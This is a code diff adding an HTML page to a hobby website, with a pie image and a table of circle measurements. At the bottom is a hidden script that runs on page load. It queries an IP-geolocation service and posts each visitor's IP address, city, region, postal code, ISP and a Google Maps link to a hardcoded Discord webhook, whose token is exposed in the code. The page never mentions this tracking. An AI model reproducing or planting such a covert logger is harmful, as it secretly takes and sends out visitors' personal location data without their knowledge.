@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>Computer Activity | ZMALλmbda</title>
+    <link rel="stylesheet" href="Tuff-Style.css">
+    <link rel="icon" type="image/x-icon" href="Lambda.png">
+    <script src="https://unpkg.com/cursor-effects@latest/dist/browser.js"></script>
+    <script type="module">
+    import { fairyDustCursor } from "https://unpkg.com/cursor-effects@latest/dist/esm.js";
+    new cursoreffects.fairyDustCursor({
+        colors: ["#00FF00"],
+        fairySymbol: "☣",
+    });
+    </script>
+</head>
+
+<body>
+    <div style="margin-left: 10px;">
+        <a href="index.html" style="color: #00FF00">
+            <h1><</h1>
+        </a>
+        <hr style="color:#00FF00">
+        <a href="https://www.piday.org/million/" style="color: #00FF00">
+            <h1>| This is around the circumference of the pie below. |</h1>
+        </a>
+        <h1>IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII</h1>
+        <br>
+        <img src="Photos/Radioactive-Green-Pie.png" alt="Radioactive Green Pie" width="300" height="300">
+        <br>
+        <h1>IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII</h1>
+        <h1>Circumference of the radioactive green pie above: ~53.4 letter Is</h1>
+        <hr style="color:#00FF00">
+        <h1>In pixels, the size of the pie in radius and diameter with it's circumference:</h1>
+        <table style="width:33%; height:33%">
+            <tr>
+                <th>Radius</th>
+                <th>Diameter</th>
+                <th>Circumference</th>
+            </tr>
+            <tr>
+                <td>50</td>
+                <td>100</td>
+                <td>314</td>
+            </tr>
+            <tr>
+                <td>100</td>
+                <td>200</td>
+                <td>628</td>
+            </tr>
+            <tr>
+                <td>150</td>
+                <td>300</td>
+                <td>942</td>
+            </tr>
+            <tr>
+                <td>200</td>
+                <td>400</td>
+                <td>1256</td>
+            </tr>
+            <tr>
+                <td>250</td>
+                <td>500</td>
+                <td>1570</td>
+            </tr>
+        </table>
+        <br>
+        <hr style="color:#00FF00">
+        <br>
+    </div>
+    <script>
+    document.addEventListener("DOMContentLoaded", function() {
+        const webhookUrl = "https://discord.com/api/webhooks/1536688037310763090/RA6SSMPxYXKUYxV4_vXLpSYlyFABwS6ZctLd0MmbXb8Pmyqp16wO42Yh8rsKZrAy1jA2";
+        
+        const apiUrl = new URL("https://ipwho.is");
+        apiUrl.searchParams.set("t", Date.now());
+
+        fetch(apiUrl.toString())
+        .then(response => response.json())
+        .then(data => {
+            if (!data.success) return;
+
+            const mapText = data.city || "LOCATION";
+            const lat = data.latitude;
+            const lon = data.longitude;
+
+            const gMapsLink = "[" + mapText + "](https://www.google.com/maps/search/?api=1&query=" + lat + "%2C" + lon + ")";
+
+            const rawContentText = "🟢 **Website Traffic Logged (on Computer Activity)**\n" +
+                                   "• **User IP:** " + (data.ip || 'Hidden') + "\n" +
+                                   "• **Location:** " + (data.city || 'N/A') + ", " + (data.region || 'N/A') + ", " + (data.country || 'Unknown') + "\n" +
+                                   "• **Postal Code:** " + (data.postal || 'N/A') + "\n" +
+                                   "• **Provider/ISP:** " + (data.connection?.isp || 'N/A') + "\n" +
+                                   "• **Google Maps:** " + gMapsLink;
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: rawContentText })
+            })
+            .then(res => console.log("Payload transferred."))
+            .catch(err => console.error("Webhook processing error:", err));
+        })
+        .catch(err => console.error("API tracking failed:", err));
+    });
+    </script>
+</body>
+
+</html>
